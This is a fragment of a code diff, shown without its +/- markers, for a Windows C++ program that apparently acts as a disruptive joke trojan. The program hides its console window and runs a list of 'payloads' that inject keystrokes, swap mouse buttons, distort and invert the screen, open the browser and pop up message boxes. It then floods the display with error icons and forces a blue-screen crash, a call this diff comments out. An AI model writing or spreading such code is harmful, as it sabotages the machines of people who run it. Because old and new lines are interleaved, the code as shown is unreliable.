#include <tchar.h>
#include <strsafe.h>

#pragma comment(linker, "/SUBSYSTEM:windows /ENTRY:mainCRTStartup") // don't open console window
#pragma comment(lib, "wininet") // fixes weird thing with wininet unresolved symbols
#pragma comment(lib, "shell32")

@@ -229,15 +230,15 @@ void PayloadBrowser(void)
//  DONE bsod at end
void LaunchPayloads(void)
{
	std::array<std::function<void(void)>, 8> payloads = {
	std::array<std::function<void(void)>, 7> payloads = {
			PayloadKeyboardInput,
			PayloadSwapMouseButtons,
			PayloadCursor,
			PayloadScreenWobble,
			PayloadBrowser,
			PayloadScreenGlitch,
			PayloadMessageBox,
			PayloadInvertScreen
			PayloadMessageBox
			//PayloadInvertScreen
	};

	for (unsigned i = 0; i < payloads.size(); i++) {
@@ -262,10 +263,10 @@ void PromptToLogOut(void) {
		for (int i = 0; i < 500; i++) {
			DrawIcon(hdc, dx(mt), dy(mt), LoadIcon(NULL, IDI_ERROR));
			DrawIcon(hdc, dx(mt), dy(mt), LoadIcon(NULL, IDI_WARNING));
			std::this_thread::sleep_for(std::chrono::milliseconds(1));
			std::this_thread::sleep_for(std::chrono::seconds(13));
		}
	}
	reboot(REBOOT_BLUESCREEN);
	//reboot(REBOOT_BLUESCREEN);
}

int main(void)